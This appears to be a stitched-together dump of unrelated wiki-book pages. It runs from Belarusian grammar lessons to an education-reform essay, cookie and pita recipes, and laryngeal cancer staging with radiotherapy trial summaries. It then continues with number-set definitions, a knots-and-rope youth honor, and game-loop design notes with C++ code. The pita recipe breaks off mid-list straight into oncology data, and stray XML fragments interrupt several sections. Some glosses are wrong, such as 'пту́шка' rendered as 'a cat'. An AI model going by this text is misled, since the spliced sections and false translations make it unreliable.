'''Сусе́дзi Белару́сi - Расiя, Украiна, По́льшча, Лiтва́ i Ла́твiя.''' The neighbours of Belarus are Russia, Ukraine, Poland, Lithuania and Latvia.

==''у'' after vowels==

It is not normal for Belarusian that ''у'' be preceeded by a vowel. It is usually replaced by ''ў'' in such a position. However, there is a number of words in which ''у'' after vowels makes a syllable and thus is not replaced by ''ў''. They are all borrowings, most of them having the ''us'' or ''um'' ending characteristic to Latin.

'''ра́дыус''' a radius

'''Сiрыус''' Sirius

'''Іу́да''' Judah (the betrayer of Christ)

European borrowings having ''au'' or ''ou'' diphthongs also have vowel+''у'' combinations.

'''шо́у''' a show

'''аудыто́рыя''' a lecture hall

A number of such words (earlier borrowings), however, use ''ў'' rather than ''у''.

'''а́ўтар''' an author

==Noun Declension Groups==

Belarusian nouns are classified into three groups according to endings they get in declension.

The first declension consists of feminine and masculine nouns ending with ''а'' or ''я''.

The second declension is made by neuter nouns and masculine nouns ending with a consonant (having a &quot;zero ending&quot;).

The third declension, much less numerous, consists of feminine nouns with zero ending.

==Plural Noun Genitive==
===First Declension===

Most first declension nouns have a zero ending in plural Genitive.

'''рака́''' a river - '''рэк''' of rivers

'''каро́ва''' a cow - '''каро́ў''' of cows

'''скры́ня''' a box - '''скры́нь''' of boxes

'''саба́ка''' a dog - '''саба́к''' of dogs

Nouns ending with a consonant + ''ка'' obtain ''а'' before ''к'' in plural Genitive (or ''е'' if the first consonant is soft).

'''пту́шка''' a cat - '''пту́шак''' of cats

'''ка́зка''' a tale - '''ка́зак''' of tails

'''ля́лька''' a doll - '''ля́лек''' of dolls

'''дзя́дзька''' an uncle - '''дзя́дзек''' of uncles

Nouns ending with a consonant + consonant + ''а'', when the second consonant is not ''к'', have ''оў'' (''аў'' when unstressed) ending in plural Genitive.

'''царква́''' a church - '''цэ́ркваў''' of churches

===Second Declension===

Second declension nouns usually have ''оў'' (''аў'' when unstessed) for hard basis and ''ёў'' (''яў'' when unstressed) for soft basis.

'''лес''' a forest - '''лясо́ў''' of forests

'''конь''' a horse - '''канёў''' of horses

'''го́рад''' a town - '''гарадо́ў''' of towns

'''вакно́''' a window - '''во́кнаў''' of windows

'''по́ле''' a field - '''палёў''' of fields

===Third Declension===

Third declension nouns usually have ''эй'' (''ей'' for soft basis) ending in plural Genitive.

'''мыш''' a mouse - '''мышэ́й''' of mice

'''гусь''' a goose - '''гусе́й''' of geese

Some third declension nouns, however, have ''оў'' (''аў'') or ''ёў'' (''яў'') ending in plural Genitive.

'''рэч''' a thing - '''рэ́чаў''' of things

==The Numbers (1 to 10)==

Here are the Belarusian numbers from one to ten.

'''адзiн''' one

'''два''' two

'''тры''' three

'''чаты́ры''' four

'''пяць''' five

'''шэсць''' six

'''сем''' seven

'''во́сем''' eight

'''дзе́вяць''' nine

'''дзе́сяць''' ten

The word ''адзiн'' is deflected by gender and number.

'''адзiн го́рад''' one town

'''адно́ вакно́''' one window

'''адна́ ву́лiца''' one street

'''адны́ дзве́ры''' one door

The plural form ''адны'' is used with nouns that have no singular form and are used in plural even when denoting a single object. It also can be used when ''адзiн'' means ''alone'' or ''only''.

'''Я тут адзiн.''' I am here alone.

'''Мы тут адны́.''' We are here alone.

'''Яны́ адны́ до́бра пла́ваюць.''' = '''То́лькi яны́ до́бра пла́ваюць.''' Only they swim well.

The word ''два'' has a feminine form ''дзве''.

All other numbers do not deflect.

With ''адзiн'' the nouns are used in the Nominative.

With ''два'', ''тры'' and ''чаты́ры'' the nouns are used in plural Nominative.

With other numbers the nouns are used in plural Genitive.

'''адзiн год''' one year - '''два гады́''' two yearts - '''тры гады́''' three years - '''пяць гадо́ў''' five years

'''адно́ ко́ла''' one wheel - '''два ко́лы''' two wheels - '''чаты́ры ко́лы''' four wheels - '''шэсць ко́лаў''' six wheels

'''адна́ мыш''' one mouse - '''дзве мы́шы''' two mice - '''тры мы́шы''' three mice - '''пяць мышэ́й''' five mice

'''адна́ рака́''' one river - '''дзве ракi''' two rivers - '''тры ракi''' - three rivers - '''пяць рэк''' five rivers

Note carefully the last example. The ending of the noun is not shifted as it usually is with feminine nouns having stressed endings.

The question word to ask about quantity is ''ко́лькi''.

'''Ко́лькi тут паве́рхаў? - Тут адзiн паве́рх.''' How many floors are here? - There is one floor here.

'''Ко́лькi там гусе́й? - Там чаты́ры гу́сi.''' How many geese are there? - There are four geese there.

      <text xml:space="preserve">Here's my list.

=='''Context rather than Content is of primary importance.'''==

In an era of accountability, content is being emphasized more than ever before.  Students are being forced to learn concrete facts at the expense of abstract thought strategies.  Likewise, teachers are forced to master the content of their specialty(ies) to such a degree that their other strengths are left out.  Teachers don't get to hone their various skills, and students don't get the benefit of linking the diverse knowledge most teachers could offer in a better system.  

The world is changing, (duh), and there is no way for us to predict with any level of certainty how the world will look when our students are fully-fledged members of the working world.  Nonetheless, the system continues to force-feed its students arbitrarily determined content whose value is impossible to understand.  The current focus on content reminds me of a &quot;blind&quot; wager in some gambling game.  

The number one change issue in my book is context rather than content.  As teachers, our first responsibility is to prepare our students for the world they will encounter after they leave our classroom.  It seems to me that, since describing this future-world is impossible, teaching the students how to think and how to find information -- rather than exactly what information to know -- makes much more sense.



=='''Recursive Learning: Learning does not always happen in linear fashion.'''==

Today's education system, as we all know, very closely mirrors the education system of the distant past.  Our society's scientific knowledge, on the other hand, does not.  We are lucky enough to have vast knowledge of the human brain at our disposal.  Likewise, our educational scholars have researched learning patterns and other pertinent areas of educational psychology and instructional methods to the point where best practices are no longer a matter of conjecture; educators know the right way to teach.  Just the same, an object at rest tends to stay at rest, and our educational system has followed this rule.  

While many specific things need to change, one irrefutable fact stands above them all.  This is my number two change issue -- learning is not linear.  Learners need to progress at their own paces.  A system which employs annual promotion or retention is irresponsible to our students, given all the knowledge the educational community has at its disposal.  Another analogy, (since we all liked the last one so well):  the current practices of the education system that ignore the fact that learning is recursive are a lot like, (but perhaps not quite as extreme as), principals handing their students cigarettes on the way into the building every morning!

If education leaders put the community's knowledge in practice once and for all, individualized learning programs would no longer be novelties but would be par for the course.  Students could learn at their own pace.  Specific reforms that come to mind are, as I mentioned before, a departure from the current model of annual promotion or retention, a modularized approach to knowledge mastery and a more flexible model of staffing and administering the schools.  Learning theory has proved that learning takes place at different rates for different students.  Once the community recognizes this fact, schools can begin to responsibly serve their students.



=='''Digital Divide: How long do we wait to implement these new technologies without waiting too long?'''==

Let me start by saying that I have no idea how to answer the question posed by my number three change issue.  The digital divide is very very real, and I have no idea how to negotiate with it.  I don't feel bad making this confession, because I get the distinct impression that nobody else knows how to deal with the digital divide either.  We all know, to one degree or another, that it exists, but we rarely take the digital divide into consideration when it comes to decisions of technology implementation.  In my work here at ODU, I've been guilty of the same negligence.  Generally speaking, when educators get a bright idea for technology integration into curriculum, we do it without consideration of who may be disenfranchised by the implementation.  The result has been that technology has not been used to its utmost potential in any educational setting.  Likewise, students on the overwhelmingly rural, poor and non-white side of the digital divide go without the technologies the rest of us take for granted.

Some scholars claim that the digital divide is getting smaller.  After all, more people have internet access today than they did five years ago.  However, technological advances are outstripping these gains.  New technologies are creating an equally intimidating new digital divide -- not between those with internet access and those without, but between those who can efficiently use technology and those who cannot.  This is the divide which needs to be explored and traversed.  As educators, we need to focus much of our resources on training young, newly &quot;arrived&quot; digital immigrants in the most effective ways possible.  The world of the future is uncertain, but it is extremely likely that technology will play a very important role in this world.  In order to give our students access to the opportunities they need and deserve, we cannot simply avoid technology.  Rather, we must find ways to educate our students in and grant them access to sophisticated technology that is, at present, reserved for the wealthy.

My proposition is a common one.  Many people make it, and no one has successfully made it work.  We need to find a way to share our society's wealth.  Welfare, as it currently stands, is not the answer.  If society realized the degree to which the digital divide would shape the futures of its young people, more emphasis would be placed on this issue.  My hope is that digital divide consciousness will bring about significant and wide-sweeping social change that our world has craved for centuries.



=='''Who's Responsible? Who should be held accountable for making change happen?''' and '''Professionalizing the Teaching Profession: Teacher and Administrator Accountability and Effective Motivation'''==


My number four change issue (like all my others) may as well be my number one.  Accountability, even as it gains popularity as a buzzword, remains dangerously uncertain in the educational community today.  It is unclear who is responsible for what, and as NCLB approaches its zenith, it's easy to predict some serious finger-pointing among some of the community's most powersful people.  

As an individualistic American, I hate bureaucracy as much as the next guy, but I think that the educational community is in need of some.  However, NCLB has proven that extrinsic regulation is not the answer.  The answer seems clear.  An organization of educational high-ups needs to be formed to develop some accountability system within the community.  Teachers can no longer be blamed for bigger problems, and until an attempt is made to meet accountability head-on, such problems will be unavoidable.

On a more positive note, were accountability finally wrestled down, change could really happen.  Passing the buck would no longer be tolerated, and real reforms could come to fruition rather than hanging in the vapor and eventually disappearing completely. 



=='''How School Policy Should be Influenced by Social Software'''==

As social software becomes a larger part of our world (and that of our students), it becomes apparent that regulations will need to be adopted to ensure the safety of our students and to ensure the quality of their educational experiences.

Child pornography, digital bullying and identity theft pose real risks to all of us, especially our digital immigrants and children.  These issues are being handled, but not quickly enough to effectively protect everyone at risk.  Some major resources need to be geared toward figuring this issue out.  On the other hand, schools have already limited student's access to various social software-type sites, and this censorship is creating a forbidden fruit mystique which may prove counter-productive.  Rather than this type of reform, it seems to me that more thoughtful safeguards need to be devised.  A spirit of shared responsibiltiy between the society and the schools would be a good starting point, but it goes without syaing that we are far from such a starting point, at least for now.

On the other side of the coin, social software presents us with many new educational opportunities.  The wikis we've used here at ODU are prime examples.  In an attempt to convert the nay-sayers (to cite yet another change issue), and in order to guarantee the quality of these new opportunities, research needs to be undertaken to address issues such as credibility and intellectual property rights.  Without this research, social software will always be scorned by the conservative academics, and the potential benefits of social software can never be realized.

==Chocolate Chip Cookies==

*8 ounces (2 sticks) unsalted butter, at room temperature
*1 cup packed dark brown sugar
*1/2 cup granulated sugar
*2 large eggs
*2 cups all-purpose flour
*1 teaspoon salt
*3/4 teaspoon baking soda
*1 teaspoon pure vanilla extract
*3 cups semisweet chunks or morsels.

Place the butter in a large bowl and cream at high speed until
fluffy. Add the sugars and beat until light and fluffy, about 4
minutes, scraping down sides of bowl occasionally. Beat in eggs, one
at a time, until completely mixed.

In a separate bowl, mix flour, salt and baking soda. Add to the
butter mixture at low speed until just combined and add vanilla
extract. Beat on medium speed, scraping bowl down, until blended. Do
not over mix.

Add chocolate chunks and mix till thoroughly combined. Refrigerate
batter until cold, preferably overnight.

Preheat a conventional oven to 350 degrees or a convection oven to
300 degrees, and line several baking sheets with parchment paper. Drop
heaping spoonfuls of batter 2 inches apart on the lined baking sheets
and bake, turning tray once, until golden brown around edges and soft
(but not bubbly), about 9 minutes in a convection oven or 12 in a
conventional one. Cool on a wire rack.

Yield: 36 to 72 cookies, depending on size.

==Pita Bread==
*3 cups flour
*1 1/2 teaspoons salt

**T3 - vocal cord fixation, or invasion of the following: postcricoid area, pre-epiglottic tissues, paraglottic space, or minor thyroid cartilage erosion (inner cortex)
**T4a - invades through thyroid cartilage or invades tissues beyond the larynx (trachea, soft tissue of neck, extrinsic muscles of the tongue, strap muscles, thyroid, esophagus)
**:Note: extrinsic muscles of the tongue are: genioglossus, hyoglossus, styloglossus, and palatoglossus
**T4b - invades prevertebral space, carotid, or mediastinum

*''Metastasis''
**M0 - none
**M1 - yes

''Stage Grouping''
*Stage I - T1N0
*Stage II - T2N0
*Stage III - T3N0, T1-3N1
*Stage IVA - T4a or N2
*Stage IVB - T4b or N3
*Stage IVC - M1

==Treatment==
*T1 and favorable T2N0 can be treated w/ definitive xrt or larynx conserving surgery.  
*Unfavorable T2N0 can be treated w/ definitive chemoxrt or larynx conserving surgery.
*Indications for postoperative xrt include:  close/positive margins, LVI, PNI
*Locally advanced disease should be treated with definitive chemoxrt


===Pre-op RT vs. Post-op RT===
*'''RTOG 73-03''' (1973-1979)
**Randomized. 320 patients. Operable stage T2-T4 any N (but not fixed); oral cavity, oropharynx, supraglottic larynx, hypopharynx, or maxillary sinus. Arm 1) Pre-op RT 50 Gy vs. Arm 2) Post-op RT 60 Gy. In addition, OC and OP lesions may be randomized Arm 3) definitive RT 65-70 Gy, with surgery reserved for salvage (n=43). 
**'''10-years; 1999''' PMID 1993628 &amp;mdash; &quot;Randomized study of preoperative versus postoperative radiation therapy in advanced head and neck carcinoma: long-term follow-up of RTOG study 73-03.&quot; (Tupchong L et al. Int J Radiat Oncol Biol Phys. 1991 Jan;20(1):21-8.)
***Only pre-op vs. post-op subset (n=277). Oral cavity (14%), oropharynx (17%), hypopharynx (43%), &lt;u&gt;supraglottic larynx (26%)&lt;/u&gt; 
***Outcome: LRC pre-op 58% vs. post-op 70% (SS), &lt;2 years no difference (failures 59% vs. 58%), but marked &gt;2 years (failures 27% vs 8%); OS no difference due to late (&gt;2 years) deaths from DM and from second primaries
***&lt;u&gt;Supraglottic larynx&lt;/u&gt;: LRC pre-op 53% vs. post-op 77% (SS); 78% failures &lt;2 years
***Toxicity: no difference
***Conclusion: Post-op RT better for LRC (especially in SGL), but no impact on OS due to distant failure and second primaries
**Comment: some argument for definitive chemoRT instead of surgery and post-op RT since after 2 yrs, distant mets are primary cause of failure resulting in similar 10 OS in this trial. LRC still better for post-op vs definitive RT alone. Also, different doses used, at the time believed equivalent given the setting



===Definitive RT===
*'''Varese, Italy, 1997''' (1983-92) PMID 9282245 -- Spriano G et al.  &quot;Conservative management of T1-T2N0 supraglottic cancer: a retrospective study.&quot; Am J Otolaryngol. 1997 Sep-Oct;18(5):299-305.
**166 pts w/ SGL CA tx'd w/ larynx conserving surgery or definitive xrt
**DFS 88% (surg) vs 76% (xrt)
**Ultimate local control for xrt was 92% if salvage surgery was taken into account.
**Likely of salvage rescuing a local failure was ~50%.
**Larynx preservation rate was 95% (surg) vs 72% (xrt)

*'''Rotterdam, 1990''' (1965-79) PMID 2298616  -- Hoekstra CJ et al.  &quot;Squamous cell carcinoma of the supraglottic larynx without clinically detectable lymph node metastases: problem of local relapse and influence of overall treatment time.&quot;  Int J Radiat Oncol Biol Phys. 1990 Jan;18(1):13-21.
**203 pts w/ SCC of SGL tx'd curatively.  193 tx'd w/ primary xrt reserving surgery for salvage; re-evaluation occurred at 40 Gy and definitive course to 60-70 Gy was given if pts had response at re-eval.  33 pts required surgery.
**53% RFS for T2, 39% RFS for T4

===Hyperfractionation===
*'''MDACC, 1989''' (1984-87) PMID 2808039 -- Wendt CD et al.  &quot;Hyperfractionated radiotherapy in the treatment of squamous cell carcinomas of the supraglottic larynx.&quot; Int J Radiat Oncol Biol Phys. 1989 Nov;17(5):1057-62.
**41 pts w/ SCC of SGL tx'd w/ 1.2 Gy BID to 72-79 Gy (76.8 median).
**Local control rates improved w/ hyperfractionation over historical MDACC controls (96% vs 82% at 1 yr, 87% vs 76% at 2 yrs).


*'''MGH, 1986''' (1979-84) PMID 3943989 -- Wang CC et al.  &quot;Twice-a-day radiation therapy for supraglottic carcinoma.&quot; Int J Radiat Oncol Biol Phys. 1986 Jan;12(1):3-7.
**106 pts tx'd w/ 1.6 Gy BID to 64 Gy in split course compared to 79 pts tx'd w/ conventional fractionation to 65 Gy
**3yr local control was 76% (hyperfractionated) vs 50% (conventional)
**3yr local control for T1/T2 was 88% vs 63%
**3yr local control for T3/T4 was 66% vs 33%


===Induction Chemo-RT vs. Primary RT alone===
*'''RTOG 68-01''' -- methotrexate
**Randomized. 638 patients, Stage III-IV oral cavity (23%), oropharynx (55%), &lt;u&gt;supraglottic larynx (12%)&lt;/u&gt;, hypopharynx (10%). Arm 1) RT alone vs. Arm 2) IV MTX 25 mg q3d x5 followed by RT. RT 55-80 Gy
**'''1980''' PMID 7410127 -- &quot;Adjuvant intravenous methotrexate or definitive radiotherapy alone for advanced squamous cancers of the oral cavity, oropharynx, supraglottic larynx or hypopharynx.&quot; (Fazekas JT, Int J Radiat Oncol Biol Phys. 1980 May;6(5):533-41.)
***Outcome: median OS RT vs. MTX-RT: oral cavity 11.8 mo vs. 12.4 mo, oropharynx 13.6 mo vs. 13.1 mo, &lt;u&gt;SGL 17.2 mo vs. 19.2 mo&lt;/u&gt;, hypopharynx 9.7 mo vs. 13.4 mo
***Conclusion: Minimal gain, induction methotrexate should not be used

===Salvage Surgery===
*'''Gainesville, 1995''' (1964-91) PMID 7790245 -- Parsons JT et al.  &quot;Salvage surgery following radiation failure in squamous cell carcinoma of the supraglottic larynx.&quot;  Int J Radiat Oncol Biol Phys. 1995 Jun 15;32(3):605-9.
**206 pts tx'd curatively w/ xrt.  46 pts had local failure (22%).  Deemed successful surgical salvage if NED at 2 yrs.
**26 pts had total laryngectomy, 4 had voice sparing salvage procedure.
**Most failures after salvage were b/c of inability to control local dz.
**Rate of post-surgical complications 37%
**1/2 to 2/3 of pts w/ local failure undergo salvage surgery.  25-30% long term DFS in this population.

===Definitions===

'''Rational''' numbers are numbers which can be expressed as a ratio of two integers (with a non-null denominator).

This includes fractional representations such as &lt;math&gt;\frac{3}{4} \, , -\frac{27}{3} \, &lt;/math&gt; etc.


A rational number can also be expressed as a termininating or recurring decimal. Examples include &lt;br&gt;
&lt;math&gt;1.25 , -0.333333 , 0.999 \ldots&lt;/math&gt;

However, a decimal which does '''not''' repeat after a finite number of decimals is NOT a rational number.

One other representation that is sometimes used is that of a ratio e.g. &lt;math&gt;5:4 \, &lt;/math&gt;

The entire (infinite) set of rational numbers is normally referenced by the symbol &lt;math&gt;\mathbb{Q} \, &lt;/math&gt;.

'''Irrational''' numbers are all the rest of the numbers - such as &lt;math&gt;\sqrt{2} , \pi , e \, &lt;/math&gt;

Taken together, irrational numbers and rational numbers constitute the real numbers - designated as &lt;math&gt;\mathbb{R} \, &lt;/math&gt;.

The set of irrational numbers is infinite - indeed there are &quot;more&quot; irrationals than rationals (when &quot;more&quot; is defined precisely).


'''Algebraic''' numbers are numbers which are the root of some polynomial equation with rational coefficients. For example, &lt;math&gt;\sqrt{2} &lt;/math&gt; is a root of the polynomial equation &lt;math&gt;x^2 - 2 = 0 \, &lt;/math&gt; and so it is an algebraic number (but irrational).

'''Transcendental''' numbers are irrational numbers which are '''not''' the root of any polynomial equation with rational coefficients.  For example, &lt;math&gt;\pi , e \, &lt;/math&gt; are not the roots of any possible polynomial and so they are transcendental.

The set of transcendental numbers is infinite - indeed there are &quot;more&quot; transcendental than algebraic numbers (when &quot;more&quot; is defined precisely).

      <comment>/* 1. Define the following terms: */</comment>
      <text xml:space="preserve">{{honor_header|2|1975|Recreation|General Conference}}
{{AY Master|Wilderness}}
==1. Define the following terms:== 
It's a good idea to begin this honor with the definitions so your Pathfinders have a working vocabulary of the various terms involved.  Telling them to &quot;make a bight&quot; or &quot;take the standing part&quot; makes little sense until these terms are understood.
[[Image:Bight.jpg|thumb|A bight]]
;a. Bight: The term bight refers to any curved section, slack part, or loop between the two ends of a rope,
;b. Running end: Also called the working end, it is the free end of the rope.  This is the end of the rope in which a knot is being tied.
;c. Standing part: The part of the rope between the Running end and the Standing end (the end that doesn't move, think of it as if someone is holding it)
;d. Underhand loop: A loop formed by passing the running end of a line under the standing part.
;e. Overhand loop: A loop formed by passing the running end of a line over the standing part.
;f. Turn: {{:Adventist Youth Honors Answer Book/Knot/Turn}}
;g. Bend: A bend is used to tie two ropes together, as in the Sheetbend. Technically, even the Reef knot is a bend
;h. Hitch: A hitch is used to tie a rope to a spar, ring or post, such as the Clove hitch. Hitches can also be used to tie one rope ONTO another rope, as in the Rolling hitch.
;i. Splice: A knot formed by interweaving strands of rope rather than whole lines. More time consuming but usually stronger than simple knots.
;j. Whipping: A binding knot used to prevent another line from fray.

==2. Know how to care for rope.==
* a. Keep the rope clean.
* b. Always coil a rope before storing it.
* c. Make sure wet rope is dry before coiling it.
* d. Return rope to its proper place after using it.

==3. Describe the difference between laid rope and braided rope and list three uses of each.==
In laid rope, three bundles of fiber or twine are twisted in the same direction, placed close to each other, and allowed to twist together.  In braided rope, the fibers are woven together, often around some core material.

===Uses of Laid Rope===
# Repels water
# Able to withstand immense strain.  
# Can be spliced with standard techniques.

===Uses of Braided Rope===
# Works well with pulleys and rigging.
# Spinning (lariats and lassos).
# Decorative knots.

==4. Identify the following types of rope:==
;a. Manila: Manila is a type of fiber obtained from the leaves of the abacá (Musa textilis), a relative of the banana. It is mostly used to make ropes and it is one of the most durable of the natural fibers, besides true hemp.  Manila is a coarse, brown fiber, about the same color and feel as a coconut shell.
;b. Sisal: Sisal is valued for cordage use because of its strength, durability, ability to stretch, affinity for certain dyestuffs, and resistance to deterioration in saltwater.  Sisal ropes and twines are widely employed for marine, agricultural (bailing twine), and general industrial use. Sisal fibers are smooth, straight and yellow and can be long or short.
;c. Nylon: Nylon rope is often white, but any color is possible.  It has a smooth, silky feeling to it, and it coils easily.  Nylon rope does not float in water.  It is a synthetic-fiber rope.
;d. Polypropylene: Polypropylene rope is most often yellow, though any color is possible.  It is often used in marine applications because it floats in water.  The rope is sometimes difficult to tie as it is somewhat stiff and brittle.  It is a synthetic-fiber rope.

The easiest way to make an initial identification of a rope is to visit a hardware store where rope is sold.  The packaging will tell you what the rope is made of.  If you want to be sure, buy some of each type (with the labeling) or examine it closely in the store.

==5. What are some advantages and disadvantages of synthetic rope?==
===Advantages===
*Improved abrasion-resistance
*Better UV-resistance
*Lighter
*Length does not vary as much when wet
*Rot-resistant
===Disadvantages===
*Some synthetics do not hold knots well
*More slippery
*Melts when heated
*Stretches more than natural ropes.

==6. Do the following to rope:==
===a. Splice===
A splice is used to join the ends of two ropes and results in the spliced part being about twice as thick as the non spliced part. The short splice retains more of the rope strength than any knots that join rope ends.  It is tied using the same techniques as the eye splice (see below).
*[http://www.tollesburysc.co.uk/Knots/Rope_splice.htm Short splice animated]

===b. Eye splice===
{{:Adventist Youth Honors Answer Book/Knot/Eye splice}}

===c. Back splice===
A '''back splice''' (also called an '''end splice''') is a splice where the strands of the end of the rope are spliced directly back into the end without forming a loop. It is used to finish off the end of the rope to keep it from fraying. The end of the rope with the splice is about twice the thickness of the rest of the rope.  Begin by unraveling the strands, and tie a crown knot.  Then begin splicing the rope onto itself as with the short splice.

===d. Finish the end of a rope with a double crown, whipping, or a Matthew Walker's knot.===

      <text xml:space="preserve">Factorization is is mostly covered by Theorem 4 of Divisibility (only uniqueness left to prove}


If you go beyond just a definition of multiplicative function, then there is enough material to cover several more chapters.

Probably a bit advanced by comparison with the early chapters.

      <text xml:space="preserve">Though there are many different types of video games, there are a few properties that are constants: Every game requires at least one player, every game gives the player at least one challenge, Every game uses a display, Every game has at least one method of input/control.

==The User Interface==
As described at the beginning of this chapter, the user interface is made up of sprites, menus and so forth. Its what the user is given to control the actions within the game. These graphics are defined as '''buttons''' which can be pushed, or a ''character''' which can be moved by the arrow keys. All of these elements are a part of the user interface.

===The Main Menu===
To start off with, just about every video game boots up to a '''main menu'''. This is usually a screen with some type of background, with an arrangement of buttons for actions such as ''new game'' or ''start game'', ''options'', ''load game'' and ''quit game''. 

This screen acts as a control panel for the game, allowing the player to change settings, choose modes, or access the actual game. 

Sometimes, a game will use the main menu as the ''in game menu''. The in game menu is usually accessed by the ''escape key'' or the ''start button'' during gameplay. The in game menu allows the player to access most of the main menu actions with additional ones such as displaying character stats, points, inventory and so forth. Not all menus have to be squares with words in them though. The game [http://en.wikipedia.org/wiki/Secret_of_Mana Secret of Mana] uses a creative menu where the level stays in focus while the choices form a circle about the player.

These menus are not required, but it is traditional to include them. 

===Starting the game===
When you first start up the game a series of ''splash screens'' are shown. A splash screen contains elements such as logos, movies, and so forth. This often is used to tell the player the companies that contributed to the game firsthand and sometimes gives part or whole introduction to the plot.

When the actual game has started there is often an introductory movie that gives the prologue to the plot. This is not a movie like you see in the theater but usually a better rendered use of the game's own graphics and sounds.

In most games, you will then be asked for your name and in some games you will be allowed to customize your character, settings and so forth.

This stage of the game is called the '''tutorial'''. It is not always considered a part of the game's plot, but in some games it is integrated into the game that even though it is the tutorial stage it is a part of the game's plot anyways. We will call this '''tutorial integration'''. It is widely used in games such as [http://en.wikipedia.org/wiki/Legend_Of_Zelda The Legend of Zelda] and [http://en.wikipedia.org/wiki/Mario_64 Super Mario 64] 

===Playing the game===
During gameplay there are some basic concepts that just about every game uses. They are listed below:

====Player-character relationship====
The player's role in the character. How does the player control the character? There are usually 3 types of PCR, 3rd person, 1st person and influence:

'''3rd person:''' The player is not the character but instead is controlling the character/characters impersonally.

'''1st Person:''' The player is the character/characters - and sees things from the characters point of view both personally and visually.

'''Influence:''' The player is not tied to any character/characters but merely has an influence in the game. This is seen in puzzle games such as Tetris, it can also be seen in a RTS called Majesty.

====Realm====
What is the 'world' that is portrayed by the game? Within this there are 2 considerations.

'''Character role:'''
There is also the question of what role the character plays in the game itself, there are 3 types in this sense.

'''Protagonist:''' Everything revolves around the character/characters the save the day type deal. Seen in games such as Zelda, Mario, Final Fantasy, and so forth.

'''Arcadic Conventional:''' An impersonal arcade character.

'''Influence:''' The character is a faceless influence within the realm of the game.
----

'''Law''' What are the laws, concepts, rules etc. that define the realm?

'''Graphics''' What is seen and the laws of style

'''Sound''' What is heard and the laws of style

'''Gameplay''' What is played how the game is played

===Saving/Loading===
Considering the [http://en.wikipedia.org/wiki/Saved_game saving] and loading of the game, usually this can be a basic menu action wherein the player types a save name and the game is saved. In some games though, more creative approaches are taken so that the player is not pulled out of the gaming experience. [http://en.wikipedia.org/wiki/Super_metroid Metroid] does this with its ''save stations''. 

Loading however, is usually a menu action.



== The Main Loop ==
At the heart of our game is the main loop (or game loop). Like most interactive programs, our game runs until we tell it to stop. Each cycle through the loop is like the heart beat of the game. The main loop of a real time game is often tied to the video update (vsync). If our main loop is synchronized to a fixed time hardware event, such as a vsync, then we must keep the total processing time for each update call under that time interval or our game will &quot;chug.&quot;

&lt;pre&gt;
// a simple game loop in C++

int main( int argc, char* argv[] )
{
    game our_game;
    while ( our_game.is_running())
    {
        our_game.update();
    }
    return our_game.exit_code();
}
&lt;/pre&gt;

Each console manufacturer has their own standards for video game publication, but most require that the game should provide visual feedback within the first few seconds of starting. As a general design guideline, it is desirable to provide the player with feedback as quickly as possible.

For this reason most start up and shut down code is usually processed from within the main loop. Lengthy start up and shut down code can either run in a sub thread monitored from the main update() or sliced into small chunks and executed in order from within the update() routine itself.

== State Machine ==
Even without considering the various modes of play within the game itself, most game code will belong to one of several states. A game might contain the following states and sub states:

* start up
* licenses
* introductory movie
* front end
** game options
** sound options
** video options
* loading screen
* main game
** introduction
** game play
*** game modes
** pause options
* end game movie
* credits
* shut down

One way to model this in the code is with a state machine:

&lt;pre&gt;
class state
{
public:
    virtual void enter( void )= 0;
    virtual void update( void )= 0;
    virtual void leave( void )= 0;
};
&lt;/pre&gt;

Derived classes can then override these virtual functions to provide state specific code. The main game object can then hold a pointer to the current state and allow the game to flow from state to state.

&lt;pre&gt;
extern state* shut_down;

class game
{
    state* current_state;
public:
    game( state* initial_state ): current_state( initial_state )
    {
        current_state-&gt;enter();
    }

    ~game()
    {
        current_state-&gt;leave();
    }

    void change_state( state* new_state )
    {
        current_state-&gt;leave();
        current_state= new_state;
        current_state-&gt;enter();
    }

    void update( void )
    {
        current_state-&gt;update();
    }

    bool is_running( void ) const
    {
        return current_state != shut_down;
    }
};
&lt;/pre&gt;

== Time ==
A game loop must consider both how much real time has passed and how much game time has passed. Separating the two makes slow motion (i.e. BulletTime) effects, pause states and debugging much easier. If you intend to make a game that can rewind time, like ''Blinx'' or ''Sands of Time'' you will need to be able to run the game loop forward while running the game time backwards.

Another consideration surrounding time depends on whether you want to go for a fixed or variable frame rate. Fixed frame rates can simplify much of the maths and timings within the game but they can make the game much harder to port internationally (e.g. going from 60Hz TVs in the US to 50Hz TVs in Europe.) For this reason it is advisable to pass frame time as a variable even if the value never changes. Fixed frame rates suffer from stuttering when the work load per frame reaches the limits and this can ''feel'' worse than a lower frame rate.

Variable frame rates, on the other hand, automatically compensate for different TV refresh rates. But variable rates often feel ''soggy'' in comparison to fixed rate games. Debugging, particularly debugging timing and physics issues, is usually more difficult with variable time. When implementing timing in your code there are often several hardware timers available on a given platform, often with different resolutions, overheads for accessing them and latencies. Pay special attention to the real time clocks available. You must use a clock with a high enough resolution, while not using excessive precision. You might need to handle the case where the clock wraps (for example, a 32-bit nanosecond timer will overflow back to zero every 2^32 nanoseconds which is only 4.2949673 seconds).

&lt;pre&gt;
const float game::NTSC_interval= 1.f / 59.94f;
const float game::PAL_interval=  1.f / 50.f;

float game::frame_interval( void )
{
    if ( time_system() == FIXED_RATE )
    {
        if ( region() == NTSC )
        {
            return NTSC_interval;
        }
        else
        {
            return PAL_interval;
        }
    }
    else
    {
        float current_time= get_system_time();
        float interval= current_time - last_time;
        last_time= current_time;
        if ( interval &lt; 0.f || interval &gt; MAX_interval )
        {
            return MAX_interval;
        }
        else
        {
            return interval;
        }
    }
}

void game::update( void )
{
    current_state-&gt;update( frame_interval());
}
&lt;/pre&gt;

== Loading ==
Modern games are usually loaded either directly from CD or indirectly from the hard drive. Either way, your game could spend a significant amount of time in I/O access. Disc access, particularly CD and DVD access, is a lot slower than the rest of the game. Many console manufacturers make it a standard that all disc access must be indicated visually; and that is not a bad design choice anyway.

However, most disc access API functions (particularly those that map through the standard I/O of the C runtime library) stall the processor until the transfer is complete. This is called synchronous access.

=== Multi-threaded disc access ===
One way to get feedback while accessing the disc is to run disc operations in their own thread. This has the advantage of allowing other processing to continue, including drawing some visual feedback of the disc operation. But the cost is that there is a lot more code to write and access to resources needs to be synchronized.

=== Asynchronous disc access ===
Some console operating system API's handle some of the multi-threading code for you by allowing disc access to be scheduled with asynchronous read operations. Asynchronous reads can tell that they are done either by polling with the file handle or using a callback.

== Renderable Objects ==
Whether a game uses 2D graphics, 3D graphics, or a combination of both, the engine should handle them similarly. There are three main things to consider.
# Certain objects may take a while to load, and can momentarily freeze the game.
# Some machines run slower than others, and the gameplay must continue with a low framerate.
